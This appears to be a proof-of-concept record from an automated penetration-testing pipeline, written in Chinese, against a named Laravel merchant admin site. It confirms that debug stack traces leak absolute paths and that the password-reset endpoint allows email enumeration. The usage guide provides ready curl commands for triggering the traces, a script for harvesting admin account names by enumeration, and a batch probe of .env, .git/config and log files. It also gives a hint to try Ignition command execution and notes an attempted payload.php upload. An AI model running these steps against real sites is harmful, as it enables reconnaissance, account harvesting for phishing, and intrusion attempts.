# Laravel 后台 APP_DEBUG 开启（异常响应泄完整堆栈+绝对路径）+ /password/email 邮箱枚举 + 升级面证否清单（Ignition/.env/日志/上传）

- **code**: laravel-app-debug-password-email-enum-recurpay-admin
- **kind**: poc
- **category**: info-leak
- **component**: Laravel 商户后台（Apache/2.4.41 Ubuntu 前置）
- **versions**: Laravel 8.x/9.x 系（Illuminate Routing/Foundation 目录结构，具体版本未由响应确认）
- **severity**: low
- **language**: markdown
- **source**: manual
- **verified**: 1
- **verified_note**: task#8 / finding_id=136 与 finding_id=152（finding_checks.verdict=verified，findings.status=confirmed），2026-11-11 17:2x 与 18:50–19:05 UTC，ARTEX 执行机 curl 对 admin.recurpay.com：① GET /nonexistent-probe-<rand> 带 Accept: application/json → HTTP/2 404 JSON，exception=Symfony\\Component\\HttpKernel\\Exception\\NotFoundHttpException、file=/var/www/recurpay-admin/vendor/laravel/framework/src/Illuminate/Routing/AbstractRouteCollection.php、line=43、trace 多条 vendor 绝对路径，Server: Apache/2.4.41 (Ubuntu)；② POST /login 坏 JSON（Accept: application/json）→ HTTP/2 419 "CSRF token mismatch."，file=.../Foundation/Exceptions/Handler.php + trace（排除 404 单点特例）；③ finding#152 追加负向验证：/_ignition/health-check → 404 同一异常堆栈（无 Ignition 路由），/.env 、/.env.bak、/.git/config、/storage/logs/laravel.log、/public/.env 均 403，/composer.json 与 /vendor/composer/installed.json 均 404（无正文），/profiles/43/settings 头像上传（合法 PNG 与 payload.php）均返回 {"success":false,"message":"Failed to view profile due to internal error."} 且回读头像未变（无写入面）；④ finding#136 另证 /password/email 对未注册邮箱返回 422 "We can't find a user with that email address."，同产品店铺子域同接口返回 200 泛化回执。判定：APP_DEBUG 确认开启，可复现泄露绝对路径/依赖/调用链；性质为纯信息泄露（附带确定性邮箱枚举），Ignition/配置日志读取/上传写入等升级路径全部证否。
- **path**: pocs/laravel-app-debug-password-email-enum-recurpay-admin/laravel_app_debug_password_enum.md
- **tags**: laravel,app-debug,stack-trace,information-disclosure,absolute-path,ignition,cve-2021-3129,password-reset,account-enumeration,negative-validation
- **created_at**: 2026-11-11T17:52:10.732Z
- **engine**: https://admin.recurpay.com
- **found_by**: vuln-scan

## 描述

Laravel 应用生产环境 APP_DEBUG 未关：带 Accept: application/json 的任意 404 与 419 CSRF 错误都会返回完整异常堆栈（exception/file/line/trace），暴露服务器绝对路径（/var/www/<app>）、vendor 依赖与中间件调用链。同目标实测升级面全部被阻断：/_ignition/* 返回 404（无 Ignition，CVE-2021-3129 类模板注入前提不成立）、.env/.git/storage 日志一律 403/404、后台头像上传载荷不落盘 → 定性为纯信息泄露。若 /password/email 尚未改为泛化返回，还可作为确定性邮箱存在性 oracle 枚举后台账号。

## 用法

```
1) APP_DEBUG 判据（必须带 Accept: application/json，HTML 请求走自定义错误页不泄露）：curl -sk -D - https://<admin-host>/nonexistent-probe-<rand> -H 'Accept: application/json' → 404 JSON 含 exception/file/trace；再 POST /login 带坏 JSON 触发 419 CSRF mismatch 交叉确认（排除 404 单点特例）。
2) 邮箱枚举：先 GET /password/reset 取 Set-Cookie 与隐藏 _token；POST /password/email _token=<t>&email=<probe> → 422 "We can't find a user with that email address." = 不存在；其它响应 = 存在。POST /password/reset 带假 token 也先做用户查找，可作第二枚举面。
3) 升级面 10 分钟排除（先做这步再决定要不要投入）：/_ignition/health-check 必须 404，再批量打 .env /.env.bak /.git/config /composer.json /vendor/composer/installed.json /storage/logs/laravel.log /public/.env；全 403/404 且体积为错误页级别即按纯信息泄露收尾，不要在上传面/Nday 上耗时间。
4) 失败常见原因：不带 Accept: application/json（只见 HTML 自定义错误页）、请求被网关改写头、APP_DEBUG=false 只回通用 500/404、目标 Laravel 已把找回密码改成泛化返回（只剩 APP_DEBUG 部分）。
```

## 正文

```
# Laravel APP_DEBUG 未关 → 异常响应泄完整堆栈/绝对路径（+ /password/email 账号枚举；升级面证否清单）

## 前置条件
- 目标为 Laravel 应用（后台/接口域），匿名可达；本例前置为 Apache/2.4.41 (Ubuntu)。
- 关键：请求头必须 `Accept: application/json`；HTML 请求走自定义错误页，不泄露堆栈。
- 无需账号/Cookie。

## 1) APP_DEBUG 验证（两条独立触发面）

### 1.1 404 路由异常
```bash
curl -sk -D - -A "$UA" "https://<admin-host>/nonexistent-probe-<rand>" \
  -H 'Accept: application/json'
```
期望：HTTP 404 + `Content-Type: application/json`，body 含：
```json
{
  "exception": "Symfony\\Component\\HttpKernel\\Exception\\NotFoundHttpException",
  "file": "/var/www/<app>/vendor/laravel/framework/src/Illuminate/Routing/AbstractRouteCollection.php",
  "line": 43,
  "trace": [ {"file": "/var/www/<app>/vendor/laravel/framework/src/Illuminate/Routing/CompiledRouteCollection.php", "...": "..."} ]
}
```

### 1.2 419 CSRF 异常（证明不是 404 单点特例）
```bash
curl -sk -D - -A "$UA" "https://<admin-host>/login" \
  -H 'Accept: application/json' -H 'Content-Type: application/json' \
  --data '{"email":'
```
期望：HTTP 419
```json
{"message":"CSRF token mismatch.","exception":"Symfony\\Component\\HttpKernel\\Exception\\HttpException","file":"/var/www/<app>/vendor/laravel/framework/src/Illuminate/Foundation/Exceptions/Handler.php","trace":[...]}
```

判据：响应中出现 `file`/`trace` 的服务器绝对路径即成立。若 `/_ignition/health-check` 为 404，说明只开了 APP_DEBUG 未装 Ignition，当前只能信息泄露，未观察到命令执行面（见 §3）。

## 2) 找回密码邮箱枚举（同目标可选面）
```bash
# 取会话与 CSRF token
curl -sk -c cj.txt -A "$UA" "https://<admin-host>/password/reset" -o reset.html
TOKEN=$(grep -oE 'name="_token" value="[^"]+"' reset.html | head -1 | sed 's/.*value="//;s/"//')

# 2.1 不存在邮箱
curl -sk -b cj.txt -A "$UA" -X POST "https://<admin-host>/password/email" \
  -d "_token=$TOKEN&email=probe@example.invalid"
# 期望：HTTP 422
# {"message":"The given data was invalid.","errors":{"email":["We can't find a user with that email address."]}}

# 2.2 格式非法邮箱 → 只走格式校验分支
curl -sk -b cj.txt -A "$UA" -X POST "https://<admin-host>/password/email" \
  -d "_token=$TOKEN&email=notanemail"
# 期望：422，errors.email = "The email must be a valid email address."

# 2.3 对照：同产品的店铺子域实施泛化返回
curl -sk -A "$UA" -X POST "https://<shop-handle>.recurpay.com/password/email" \
  -d "_token=<t2>&email=probe@example.invalid"
# 期望：200 {"message":"If registered, a reset link will be sent."}（无枚举）

# 2.4 第二枚举面：/password/reset 提交前也先查用户
curl -sk -b cj.txt -A "$UA" -X POST "https://<admin-host>/password/reset" \
  -d "token=fake<rand>&email=probe@example.invalid"
# 期望：422 仍回 "We can't find a user with that email address."
```

判据：
- `We can't find a user with that email address.` = Laravel `Passwords::INVALID_USER` 分支的**确定性存在性断言** → 该邮箱不是后台账号；
- 返回 200/302 或不同文案 = 账号存在（本环境不向真实邮箱投递，未对已注册账号做正向对照）；
- 逐邮箱批量打即可得到后台账号名单。

## 3) 升级面排查（先做这步，10 分钟内证否，别在 Nday 上耗时间）

### 3.1 无 Ignition → CVE-2021-3129 类模板注入前提不成立
```bash
curl -sk -o /dev/null -w '%{http_code} %{size_download} %{content_type}\n' \
  -H 'Accept: application/json' "https://<admin-host>/_ignition/health-check"
# 本环境实测：404 + 同一个 NotFoundHttpException JSON 堆栈
# 若返回 {"can_execute_commands":true}，再试 /_ignition/execute-solution
```
判据：`/_ignition/health-check` 404（且堆栈中无 Ignition 类）⇒ 未装/未路由 Ignition，不要往日志投毒链投入。

### 3.2 敏感文件/目录一把梭
```bash
for p in .env .env.bak .git/config composer.json vendor/composer/installed.json \
         storage/logs/laravel.log storage/framework/views/ public/.env; do
  printf '%-38s ' "$p"
  curl -sk -o /dev/null -w '%{http_code} %{size_download} %{content_type}\n' "https://<admin-host>/$p"
done
```
本环境基线（2026-11-11 实测）：
```
.env                            403 520  text/html
.env.bak                        403 199  application/json
.git/config                     403 199  application/json
composer.json                   404 6609 (错误页)
vendor/composer/installed.json  404 6609 (错误页)
storage/logs/laravel.log        403 520  text/html
storage/framework/views/        301 341  (目录重定向；跟随后仍 403/404，不代表可列目录)
public/.env                     403 520  text/html
```
判据：全部 403/404 且体积为错误页级别（几百 B ~ 几 KB）⇒ 无配置/日志/源码正文可读，APP_DEBUG 止步于信息泄露。
注意 403 的两种语义：199B JSON 与 520B HTML 是两套错误处理器；要判断"文件存在且被保护"，须用同后缀的必然不存在路径做体积/类型对照，不能只看状态码。

### 3.3 上传面联动（需后台会话）
- 后台 `/profiles/<id>/settings` 的 multipart `name=avatar`：合法 PNG 与 `payload.php` 均返回 `{"success":false,"message":"Failed to view profile due to internal error."}`，回读头像仍为默认图 → 文件未落盘，不形成写入面。
- 判据：上传返回 success 且能在 web 路径回读/解析内容才算写入面；仅 HTTP 200 不算。

### 3.4 推翻条件（复核用）
出现任一条即应把判定从"纯信息泄露"升级评估：
- `/_ignition/execute-solution` 返回 200 且有执行结果；
- 任一 `.env`/`.log`/`installed.json` 返回 200 正文；
- 上传文件可在 web 路径被解析/回读。

## 影响
- 泄露服务器绝对路径、vendor 依赖、中间件顺序与内部调用链 → 为后续路径穿越/文件上传/日志定位提供精确路径与版本指纹；
- 若找回密码接口未泛化，可零成本得到确定性后台账号名单（定向钓鱼/口令强度验证的用户名表）。

## 失败常见原因
- 不带 `Accept: application/json` → 返回 HTML 自定义错误页，看不到堆栈；
- 反向代理/WAF 改写请求头（强制 `Accept: text/html`）→ 同样看不到堆栈；
- `APP_DEBUG=false` → 只回通用 500/404，无 file/trace；
- 目标 Laravel 版本已把 `/password/email` 改为泛化返回（Laravel 6+ 默认行为）→ 枚举不成立，只剩 APP_DEBUG；
- 目标为 PHP-FPM+nginx 时 403/404 语义与 Apache 不同，需要重新做体积对照，不能套用本基线。
```
